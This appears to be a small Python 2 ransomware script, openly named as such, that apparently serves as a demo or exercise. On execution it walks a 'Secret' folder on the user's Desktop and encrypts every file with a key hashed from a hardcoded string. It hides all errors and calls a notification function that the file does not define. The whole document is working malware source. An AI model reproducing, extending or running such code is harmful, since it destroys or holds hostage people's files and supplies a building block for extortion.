import os
from random import randint
from Crypto.Hash import SHA256
from encrypt_file import encrypt_file

def ransomware():
	paths=[os.getenv('HOME')+"/Desktop/Secret/"]
	key="somerandomkey"
	hashkey=SHA256.new(key).digest()

	try:
		for path_to_go in paths:
			for root, dirs, files in os.walk(path_to_go):
				for names in files:
					print "[+]Encrypting\t"+names
					encrypt_file(hashkey,str(os.path.join(root,names)))

	except Exception as e:
		pass

	try:
		notify()
	except Exception as e:
		pass

ransomware()